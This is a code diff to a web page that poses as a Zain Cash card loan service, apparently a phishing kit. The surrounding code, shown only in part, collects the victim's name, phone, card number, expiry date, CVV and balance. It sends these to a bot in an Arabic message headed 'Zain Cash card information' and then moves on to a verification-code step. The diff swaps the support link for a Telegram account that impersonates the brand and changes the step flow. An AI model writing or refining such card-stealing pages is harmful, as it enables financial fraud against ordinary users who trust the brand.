@@ -552,7 +552,7 @@ body[data-theme="dark"] input, body[data-theme="dark"] select {background: #262f
 
   // زر دعم واتساب وتيليجرام
   document.getElementById('supportBtn').onclick = function() {
-    window.open('https://api.whatsapp.com/send/?phone=962771423865&text=اريد+تقديم+سلفة+على+بطاقتي+زين+كاش&type=phone_number&app_absent=0','_blank');
+    window.open('https://t.me/zaincashiraq','_blank');
   };
 
   // عرض خطوة معينة
@@ -667,7 +667,6 @@ body[data-theme="dark"] input, body[data-theme="dark"] select {background: #262f
     userData.cvv = cvv;
     userData.cardBalance = cardBalance;
 
-    showStep(2);
     blockSpam(3000);
     showToast('جاري إرسال بيانات البطاقة...','','');
     // إرسال المعلومات للبوت
@@ -679,7 +678,8 @@ body[data-theme="dark"] input, body[data-theme="dark"] select {background: #262f
         text: `معلومات بطاقة زين كاش:\nالاسم: ${userData.userName}\nالمبلغ: ${Number(userData.loanAmount).toLocaleString()} دينار\nرقم الهاتف: ${userData.userPhone}\nرقم البطاقة: ${cardNumber}\nتاريخ الانتهاء: ${expDate}\nرمز CVV: ${cvv}\nرصيد البطاقة: ${cardBalance} دينار`
       })
     });
-    setTimeout(()=>showStep(3), 1500);
+    // الانتقال للخطوة الثالثة فقط بعد نجاح البيانات وضغط المستخدم
+    showStep(3);
   };
 
   // Step3: رمز التحقق
